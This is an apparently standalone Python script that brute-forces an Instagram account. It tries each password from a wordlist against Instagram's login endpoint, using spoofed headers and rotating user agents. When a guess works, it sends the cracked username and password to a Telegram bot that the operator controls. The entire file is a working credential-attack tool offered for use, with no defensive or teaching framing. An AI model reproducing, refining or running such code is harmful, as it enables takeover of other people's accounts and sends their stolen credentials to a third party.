import requests
import random
from user_agent import generate_user_agent
import pyfiglet


# = = = = = = = = = = = = #

Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[1;36m'
Y = '\033[1;34m' 

# = = = = = = = = = = = =#

logo = pyfiglet.figlet_format(' JACKS ')
print(B+logo)
print(B+'-----------by: jacks_dev----------')
print(B+''+F)

ID = input('> Enter Your Id : ')
token = input('enter your tokrn bot : ')


r = requests.Session()

file = input(F+' - Enter Name File : ')
rfile = open(file, 'r')
us = input('- Enter Target : ')
while True:
	username = us
	password = rfile.readline().split('\n')[0]
	
	url = 'https://www.instagram.com/accounts/login/ajax/'
		
		
	headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
         
         
	data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}


	req_login = r.post(url, headers=headers, data=data, proxies=None)
	
	if 'userId' in req_login.text:
		print(F+'User name : '+username)
		print(F+'Password : '+password)
		tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ---Welcome this 
\n- US > {username} \n- PS > {password} \n━━━━━━━━━━━━━\n•  : @Jacks_dev''')
		i = requests.post(tlg)
		break
		
		


	else:
		print(Z+'Error: '+password)
		print(X+'**********')
	
	
	